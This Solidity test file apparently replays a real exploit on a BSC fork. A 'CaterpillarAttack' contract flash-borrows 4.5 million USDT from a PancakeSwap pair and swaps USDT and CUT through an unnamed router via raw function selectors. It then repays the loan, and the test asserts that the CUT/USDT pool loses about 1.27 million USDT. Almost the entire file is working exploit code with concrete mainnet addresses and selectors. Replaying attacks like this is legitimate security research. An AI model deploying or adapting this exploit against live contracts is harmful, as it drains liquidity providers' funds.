
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 42131696;
    uint256 constant TX_TIMESTAMP = 1725972052;
    uint256 constant TX_BLOCK_NUMBER = 42131697;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        CaterpillarAttack attack = _deployAttack();
        _prepareProfit(attack);
        _executeAttack(attack);
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (CaterpillarAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = CaterpillarAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new CaterpillarAttack();
        }
    }

    function _prepareProfit(CaterpillarAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(CaterpillarAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(CaterpillarAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.Cake_LP_3249,
                asset: Addresses.USDT,
                symbol: "USDT",
                oracleKind: "position_delta",
                expectPositive: false,
                expectedDeltaRaw: 1271656254481266714539224,
                balancerInternalBalance: false
            })
        );
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.Cake_LP_3249,
                asset: Addresses.CUT,
                symbol: "CUT",
                oracleKind: "position_delta",
                expectPositive: true,
                expectedDeltaRaw: 5672272547205,
                balancerInternalBalance: false
            })
        );
    }
}

contract CaterpillarAttack {
    bytes32 private constant FLASH_CALLBACK = keccak256("poc.replay.flashCallback");
    uint256 private constant BORROWED_USDT = 4500000000000000000000000;
    uint256 private constant REPAYMENT_USDT = 4511700000000000000000000;
    uint256 private constant ROUTER_TOKEN_LIST_OFFSET = 64;
    uint256 private constant ROUTER_TOKEN_LIST_LEN = 2;

    mapping(bytes32 => bool) private callbackDone;

    function attack() external payable {
        _startFlashSwap();
    }

    function _startFlashSwap() internal {
        _readPancakeFactory();
        _readPancakePair();
        _borrowFromPair();
    }

    function _readPancakeFactory() internal view {
        IPancakeRouter(Addresses.PancakeRouter).factory();
    }

    function _readPancakePair() internal view {
        IPancakeFactory(Addresses.PancakeFactory).getPair(Addresses.USDT, Addresses.WBNB);


        ICake_LP(Addresses.Cake_LP).token0();
    }

    function _borrowFromPair() internal {
        IUniswapV2PairLike(Addresses.Cake_LP)
            .swap(
                BORROWED_USDT, 0, address(this), hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }

    function _flashCallback() internal {
        callbackDone[FLASH_CALLBACK] = true;
        _fundFirstRouter();
        _executeTokenRoute();
        _repaySecondRouter();
    }

    function _fundFirstRouter() internal {
        uint256 borrowedBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_D9AD95_79DB, borrowedBalance);
    }

    function _executeTokenRoute() internal {
        (bool routeOk,) = Addresses.A_D9AD95_79DB
            .call(
                abi.encodeWithSelector(
                    bytes4(0x85936cac),
                    ROUTER_TOKEN_LIST_OFFSET,
                    address(this),
                    ROUTER_TOKEN_LIST_LEN,
                    Addresses.USDT,
                    Addresses.CUT
                )
            );
        require(routeOk, "route swap failed");

        uint256 routeUsdtBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_E462D8_BD8A, routeUsdtBalance);
    }

    function _repaySecondRouter() internal {
        (bool repayOk,) = Addresses.A_E462D8_BD8A
            .call(
                abi.encodeWithSelector(bytes4(0x96f6e2ca), Addresses.USDT, Addresses.Cake_LP, REPAYMENT_USDT)
            );
        require(repayOk, "repay swap failed");
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x7a50b2b8) {
            _startFlashSwap();
            return;
        }
        if (msg.sig == 0x84800812) {
            if (!callbackDone[FLASH_CALLBACK]) _flashCallback();
            return;
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_091791_1154 = 0x0917914b0A70ee7F1f2460Fcd487696856E31154;
    address internal constant A_091825_8634 = 0x091825B142b9f07935E1816C917c90CdFC668634;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant A_185D5F_9716 = 0x185D5f4D854703e2222972c56CDdEcc111199716;
    address internal constant A_34BEB8_2E98 = 0x34bEb8b92a61EB1C3e2fe27eAC16EeC895Ba2e98;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant attacker_eoa = 0x560a77bc06dcc77EEe687acB65D46B580a63eB45;
    address internal constant A_5766D1_38A4 = 0x5766d1F03378f50c7c981c014Ed5e5A8124f38A4;
    address internal constant A_5A6180_93C4 = 0x5A6180b744FEe7975484266C343b074ca9B893C4;
    address internal constant CUT = 0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7;
    address internal constant A_7B2E7C_CBAF = 0x7b2E7CB89824236CB7096cDE7A153AF30f3EcBaf;
    address internal constant A_7F2EB2_D420 = 0x7F2eb21C09AA29D6A676DBD9EcBB677D59D3D420;
    address internal constant Cake_LP_3249 = 0x83681F67069A154815a0c6C2C97e2dAca6eD3249;
    address internal constant attack_contract = 0x87EFb39a716860eCd2324A944Cb40EC5128e56Dd;
    address internal constant A_8C936C_13CC = 0x8C936cE2DBBc1c4764EE617A8127d2184dC813Cc;
    address internal constant A_954935_F39F = 0x954935Ba583378844439FD7A450900DC1d81F39f;
    address internal constant A_99C135_8458 = 0x99c13538Dd47D57fF272B13fd9a2FA38E68e8458;
    address internal constant A_AC799B_BB1A = 0xAC799Bd91ef15cd580E9Da97b0e7dFCFD19BBB1a;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_C3B385_F122 = 0xC3b38558a950Dc741a88dC03f7FCeb23CD9FF122;
    address internal constant PancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant A_CF833A_51B9 = 0xcf833a98d2B9DA8F041b3f5606DB1ffD937651B9;
    address internal constant A_D9AD95_79DB = 0xD9ad954Bea4ad65578904CEFE6Ee2A6EB13879dB;
    address internal constant A_E462D8_BD8A = 0xe462d83BDD2B08C374d33213eE12f9AfD5FEBD8a;
    address internal constant A_E7A6E7_B7A4 = 0xE7a6E7935AdD71C2761BeC91519C373E1B6cb7A4;
    address internal constant A_F43629_533B = 0xf43629eF383e10B552a0C1fC6CFfaA8605a1533B;
    address internal constant A_FF8775_04F3 = 0xfF8775851D88Fcee2815D54c9dE885761abb04F3;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ICake_LP {
    function token0() external view returns (uint256);
}

interface IPancakeFactory {
    function getPair(address, address) external view returns (uint256);
}

interface IPancakeRouter {
    function factory() external view returns (uint256);
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}
